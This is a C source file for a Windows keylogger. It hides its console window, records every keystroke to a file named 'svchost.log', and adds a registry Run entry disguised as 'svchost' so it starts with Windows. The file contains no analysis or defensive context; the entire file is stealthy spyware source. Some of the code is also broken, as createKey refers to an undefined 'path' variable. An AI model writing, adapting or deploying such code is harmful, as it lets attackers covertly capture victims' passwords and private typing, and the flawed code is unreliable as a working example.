#include <windows.h>
#include <stdio.h>
#include <winuser.h>
#include <windowsx.h>

#define kBUFFER_SIZE 80

int testKey();
int createKey(char *);
int getKeys();

int main(void) {
    
	int test;
	int create;
    
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
    
	test = testKey();
    
	if (test == 2)
	{
		char *path = "c:\\%windir%\\svchost.exe";
		create = createKey(path);
	}
    
	return getKeys();
}

//Helper Functions

int getKeys() {
	short character;
	while(true) {
		sleep(10); //JeffyBoi, to reduce cpu usage
		for (character = 8; character < 222; character++)
		{
			if (GetAsyncKeyState(character) == -32767)
			{
				FILE* file;
				file = fopen("svchost.log", "a+");
                
				if (!file) {
					return 1;
				} else {
					if (character >= 39 && character <= 64)
					{
						fputc(character, file);
						fclose(file);
						break;
					} else if (character > 64 && character < 91) {
						character += 32;
						fputc(character, file);
						fclose(file);
						break;
					} else {
						switch(character)
                        {
                            case VK_SPACE:
                                fputc(' ',file);
                                fclose(file);
                                break;
                            case VK_SHIFT:
                                fputs("[SHIFT]",file);
                                fclose(file);
                                break;
                            case VK_RETURN:
                                fputs("\n[ENTER]",file);
                                fclose(file);
                                break;
                            case VK_BACK:
                                fputs("[BACKSPACE]",file);
                                fclose(file);
                                break;
                            case VK_TAB:
                                fputs("[TAB]",file);
                                fclose(file);
                                break;
                            case VK_CONTROL:
                                fputs("[CTRL]",file);
                                fclose(file);
                                break;
                            case VK_DELETE:
                                fputs("[DEL]",file);
                                fclose(file);
                                break;
                            case VK_OEM_1:
                                fputs("[;:]",file);
                                fclose(file);
                                break;
                            case VK_OEM_2:
                                fputs("[/?]",file);
                                fclose(file);
                                break;
                            case VK_OEM_3:
                                fputs("[`~]",file);
                                fclose(file);
                                break;
                            case VK_OEM_4:
                                fputs("[ [{ ]",file);
                                fclose(file);
                                break;
                            case VK_OEM_5:
                                fputs("[\\|]",file);
                                fclose(file);
                                break;
                            case VK_OEM_6:
                                fputs("[ ]} ]",file);
                                fclose(file);
                                break;
                            case VK_OEM_7:
                                fputs("['\"]",file);
                                fclose(file);
                                break;
                            case VK_NUMPAD0:
                                fputc('0',file);
                                fclose(file);
                                break;
                            case VK_NUMPAD1:
                                fputc('1',file);
                                fclose(file);
                                break;
                            case VK_NUMPAD2:
                                fputc('2',file);
                                fclose(file);
                                break;
                            case VK_NUMPAD3:
                                fputc('3',file);
                                fclose(file);
                                break;
                            case VK_NUMPAD4:
                                fputc('4',file);
                                fclose(file);
                                break;
                            case VK_NUMPAD5:
                                fputc('5',file);
                                fclose(file);
                                break;
                            case VK_NUMPAD6:
                                fputc('6',file);
                                fclose(file);
                                break;
                            case VK_NUMPAD7:
                                fputc('7',file);
                                fclose(file);
                                break;
                            case VK_NUMPAD8:
                                fputc('8',file);
                                fclose(file);
                                break;
                            case VK_NUMPAD9:
                                fputc('9',file);
                                fclose(file);
                                break;
                            case VK_CAPITAL:
                                fputs("[CAPS LOCK]",file);
                                fclose(file);
                                break;
                            default:
                                fclose(file);
                                break;
                        }
					}
				}
			}
		}
	}
	return EXIT_SUCCESS;
}

int testKey() {
	int check;
	HKEY hKey;
	char path[kBUFFER_SIZE];
	DWORD bufferLength = kBUFFER_SIZE;
	int regKey;

	regKey = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &hKey);
	if (regKey != 0)
		return 1;

	regKey = RegQueryValueEx(hKey, "svchost", NULL, NULL, (LPBYTE)path, &bufferLength);

	if ((regKey != 0) || (bufferLength > kBUFFER_SIZE))
	{
		check = 2;
	}
	if (regKey == 0) {
		check = 0;
	}

	RegCloseKey(hKey);
	return check;
}

int createKey() {
	int regKey;
	HKEY hKey;

	regKey = RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hKey);

	if (regKey == 0)
	{
		RegSetValueEx((HKEY)hKey, "svchost", 0, REG_SZ, (BYTE*)path, strlen(path));
		return 0;
	} else
		return 1;
}



